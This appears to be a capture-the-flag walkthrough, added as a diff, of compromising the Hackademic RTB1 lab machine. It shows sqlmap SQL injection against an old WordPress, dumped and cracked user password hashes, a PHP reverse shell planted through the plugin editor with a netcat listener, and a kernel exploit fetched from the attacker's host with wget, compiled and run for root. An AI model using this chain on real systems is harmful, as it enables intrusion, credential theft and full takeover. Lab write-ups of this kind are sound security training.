@@ -1,0 +1,96 @@
+$ netdiscover -i wlp2s0
+
+192.168.1.11
+
+
+$ nmap -sV 192.168.1.11
+
+PORT   STATE  SERVICE VERSION
+22/tcp closed ssh
+80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
+
+
+
+go to http://192.168.1.11/ , and in that page there is a link to 
+
+http://192.168.1.11/Hackademic_RTB1/
+
+in the source code we see that it is a WordPress 1.5.1.1  page
+
+further researches on WordPress 1.5.1.1 showd that it is vulnerable to 
+
+sql injection, the vulnerable url is http://192.168.1.11/Hackademic_RTB1/?cat=1
+
+now use sqlmap to exploit the vulnerability
+
+
+$ sqlmap -u 'http://192.168.1.11/Hackademic_RTB1/?cat=1'
+
+shows that it is vulnerable, now dump the database
+
+
+$ sqlmap -u 'http://192.168.1.11/Hackademic_RTB1/?cat=1'  --dbs
+
+available databases [3]:
+[*] information_schema
+[*] mysql
+[*] wordpress
+
+$ sqlmap -u 'http://192.168.1.11/Hackademic_RTB1/?cat=1'  -D wordpress --tables
++-------------------+
+| wp_categories     |
+| wp_comments       |
+| wp_linkcategories |
+| wp_links          |
+| wp_options        |
+| wp_post2cat       |
+| wp_postmeta       |
+| wp_posts          |
+| wp_users          |
++-------------------+
+
+$ sqlmap -u 'http://192.168.1.11/Hackademic_RTB1/?cat=1'  -D wordpress -T wp_users --dump
+
+after the dumping I found users and cracked them with hashcat
+
+hashcat -m0 -a 0 hash /home/cihan/Desktop/Me/SecLists/kaonashi14M.txt --show
+
+8601f6e1028a8e8a966f6c33fcd9aec4:maxwell				JasonKonnors
+7cbb3252ba6b7e9c422fac5334d22054:q1w2e3					GeorgeMiller
+21232f297a57a5a743894a0e4a801fc3:admin					NickJames
+a6e514f9486b83cb53d8d932f9a04292:napoleon				TonyBlack
+b986448f0bb9e5e124ca91d3d650f52c:PUPPIES				JohnSmith
+50484c19f1afdaf3841a0d821ed393d2:kernel					MaxBucky
+
+
+
+the we use George miller  http://192.168.1.11/Hackademic_RTB1/wp-admin/ and 
+login as george miller because he is admin 
+now we will use a plugin to get a reverse shell
+
+firts set up a listener
+$ nc -lnvp 4444
+
+then go to http://192.168.1.11/Hackademic_RTB1/wp-admin/plugin-editor.php?file=markdown.php
+
+and copy pentestmonkey php revershell and save it
+
+and we got shell 
+
+after looking at the kernel version I found it is vulnerable
+
+go to https://www.exploit-db.com/exploits/15285 and download the exploit
+
+now use python to serve the exploit file
+
+$ python3 -m http.server
+
+on the vulnerable machine get the file
+
+$ cd /tmp 
+$wget 192.168.1.8/15285.c
+
+$ gcc -o exploit 15285.c
+$./exploit
+$whoami
+root
